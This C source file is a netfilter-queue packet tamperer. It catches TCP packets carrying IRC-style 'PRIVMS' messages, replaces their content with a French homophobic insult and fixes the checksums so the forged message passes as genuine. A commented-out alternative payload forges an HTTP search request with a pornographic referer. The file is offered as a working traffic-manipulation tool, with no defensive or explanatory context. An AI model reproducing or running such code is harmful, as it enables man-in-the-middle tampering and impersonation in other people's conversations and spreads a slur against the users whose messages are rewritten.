#include <netinet/ip.h>
#include <libnet.h>
#include <stdbool.h>
#include <stdlib.h>
#include <stdio.h>
#include <poll.h>
#include <stdint.h>
#include <linux/netfilter.h>
#include <libnetfilter_queue/libnetfilter_queue.h>



static __thread libnet_t *libnet = NULL;

static __thread struct
{
  struct nfq_handle   *handle;
  struct nfq_q_handle *qhandle;
  struct nfnl_handle  *nhandle;

  int    qfd;
} nfq_ctx = { 0, 0, 0, -1 };

static void
clean_nfq_ctx(void)
{
}

#define __exit_if(cond, str, func) \
  do\
  {\
    if(cond)\
    {\
      fprintf(stderr,"%s", str);\
      exit(1);\
    }\
  }while(0)

#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <string.h>
#include <libnet.h>

static void
dump_pkt(char *beg, char *end, char *p, int l)
{
  static int cpt = 0;
  int i;

   puts(beg);
   for(i = 0; i < l ;++i)
   {
     printf("%c",p[i], p[i]);
   }
   puts(end);
}

static int
corrupt_packet( struct ip     *const iphdr,
                struct tcphdr *const tcphdr )
{
  
//  static char   http_payload []  = "GET /search?q=sex HTTP/1.1\r\nHost: www.google.com\r\nAccept: text/html\r\nReferer: www.youporn.com\r\n";
  static char   http_payload []  = "\nje suis une fiotte\n";
  size_t http_payload_len = strlen(http_payload);

  size_t const iphdr_len  = iphdr->ip_hl * 4;
  size_t const ip_len     = ntohs(iphdr->ip_len);;
  size_t       new_ip_len = 0;
  
  size_t const tcphdr_len = tcphdr->doff * 4;
  size_t const tcp_len    = ip_len  - iphdr_len;
  size_t const data_len   = tcp_len - tcphdr_len;
  size_t       new_tcp_len;

  new_ip_len  = ip_len - (data_len - http_payload_len);
  new_tcp_len = new_ip_len - iphdr_len;
  
  memset( ((char*)tcphdr) + tcphdr_len, 0, data_len);
  if(http_payload_len >data_len)
  {
    return 0;
  }
  
  memcpy( ((char*)tcphdr) + tcphdr_len, http_payload, http_payload_len);
  
  iphdr->ip_len = htons(new_ip_len);
  if (libnet_do_checksum(libnet, (u_int8_t*)iphdr, IPPROTO_TCP, new_tcp_len) < 0) 
  {
    fprintf(stderr, "libnet_do_checksum(TCP): %s\n", libnet_geterror(libnet));
    exit(EXIT_FAILURE);
  }

  iphdr->ip_sum = 0;
  if (libnet_do_checksum(libnet, (u_int8_t*)iphdr, IPPROTO_IP, iphdr_len) < 0) 
  {
    fprintf(stderr, "libnet_do_checksum(IP): %s\n", libnet_geterror(libnet));
    exit(EXIT_FAILURE);
  }
  return new_ip_len;
}





static int 
process_packet(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
               struct nfq_data *nfa, void *data)
{ 
  struct nfqnl_msg_packet_hdr *ph;
  int id = 0;
  int tlen = 0;
  char *buff = NULL;
  
  ph = nfq_get_msg_packet_hdr(nfa);
  if(ph)
  {
    id = ntohl(ph->packet_id);
  }
  tlen = nfq_get_payload(nfa, &buff);
  
  if( (tlen = nfq_get_payload(nfa, &buff)) >= 0)
  {
    struct ip *iphdr = (struct ip*)buff;
    if(iphdr->ip_p == IPPROTO_TCP)
    {
      struct tcphdr *tcphdr = (struct tcphdr*) ((char*)buff + (4*iphdr->ip_hl)); 
      char *payload = (char*) ((char*)tcphdr + tcphdr->doff*4);
      int plen =  (char*)(buff + tlen) - (char*)payload;
      char *ptr;
      if(strstr(payload,"PRIVMS") )
      {
        dump_pkt("\npaquet origine\n","\n----\n", (uint8_t*) iphdr, tlen);
        
        tlen = corrupt_packet( iphdr, tcphdr );
        dump_pkt("\npaquet modifié","----", (uint8_t*)iphdr, tlen);
      }
    }
  }
  
  return nfq_set_verdict(qh, id, NF_ACCEPT, tlen, buff);
}



static int
init_appz(void)
{
  int ret = 0;
  
  libnet = libnet_init(LIBNET_RAW4, NULL, NULL);
  nfq_ctx.handle = nfq_open();
  __exit_if(!nfq_ctx.handle, "nfq_open error\n", NULL);

  ret = nfq_unbind_pf(nfq_ctx.handle, AF_INET);
  __exit_if(ret < 0, "nfq_unbind error\n", NULL);

  ret = nfq_bind_pf(nfq_ctx.handle, AF_INET);
  __exit_if(ret < 0, "nfq_bind error\n", NULL);

  nfq_ctx.qhandle = nfq_create_queue(nfq_ctx.handle, 3, process_packet, NULL);
  __exit_if(!nfq_ctx.qhandle, "create_queue error\n", NULL);

  ret = nfq_set_mode(nfq_ctx.qhandle, NFQNL_COPY_PACKET, 0xffff);
  __exit_if(ret < 0, "nfq_setmode error\n", NULL);

  nfq_ctx.qfd = nfq_fd(nfq_ctx.handle);  
  return nfq_ctx.qfd;
}

static void
appz_main_loop(void)
{
  struct pollfd pd = { nfq_ctx.qfd, POLLIN, 0 };
  while(true)
  {
    int ret = poll(&pd, 1, 0);
    if(ret)
    {
      char buff[2048];
      int ret;
      ret = recv(nfq_ctx.qfd, buff, 2048, 0);
      nfq_handle_packet(nfq_ctx.handle, buff, ret);
    }
  }
}

int main()
{
  int ret;
  ret = init_appz();
  if(ret > 0)
  {
   appz_main_loop();
  }
  return 0;
}
